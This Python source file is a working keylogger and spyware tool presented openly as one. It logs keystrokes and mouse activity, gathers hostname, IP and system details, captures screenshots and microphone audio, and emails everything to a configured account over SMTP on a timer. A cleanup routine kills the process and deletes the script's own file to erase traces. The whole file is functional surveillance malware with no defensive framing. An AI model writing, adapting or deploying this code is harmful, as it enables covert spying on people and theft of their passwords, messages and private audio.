import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import glob

# Email Configuration
EMAIL_ADDRESS = "YOUR_USERNAME"
EMAIL_PASSWORD = "YOUR_PASSWORD"
SEND_REPORT_EVERY = 60  # in seconds

# KeyLogger Class
class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x} {y}\n"
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = f"Mouse {'pressed' if pressed else 'released'} at {x} {y}\n"
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x} {y} with delta {dx} {dy}\n"
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'Keylogger Report'

        msg.attach(MIMEText(message, 'plain'))

        server = smtplib.SMTP('smtp.mailtrap.io', 2525)
        server.starttls()
        server.login(email, password)
        server.send_message(msg)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        sys_info = f"""
        Hostname: {hostname}
        IP Address: {ip}
        Processor: {plat}
        System: {system}
        Machine: {machine}
        """
        self.appendlog(sys_info)

    def microphone(self):
        fs = 44100  # Sample rate
        seconds = 10  # Duration of recording
        filename = 'sound.wav'
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished

        wave_obj = wave.open(filename, 'w')
        wave_obj.setnchannels(2)
        wave_obj.setsampwidth(2)
        wave_obj.setframerate(fs)
        wave_obj.writeframes(myrecording.tobytes())
        wave_obj.close()

        with open(filename, 'rb') as file:
            self.send_mail(email=self.email, password=self.password, message=file.read())

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save('screenshot.png')
        with open('screenshot.png', 'rb') as file:
            self.send_mail(email=self.email, password=self.password, message=file.read())

    def run(self):
        self.system_information()
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        self.cleanup()

    def cleanup(self):
        if os.name == "nt":
            try:
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                os.remove(os.path.basename(__file__))
            except OSError:
                print('File is close.')
        else:
            try:
                os.system('pkill -f ' + os.path.basename(__file__))
                os.remove(os.path.basename(__file__))
            except OSError:
                print('File is close.')

# Run the KeyLogger
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
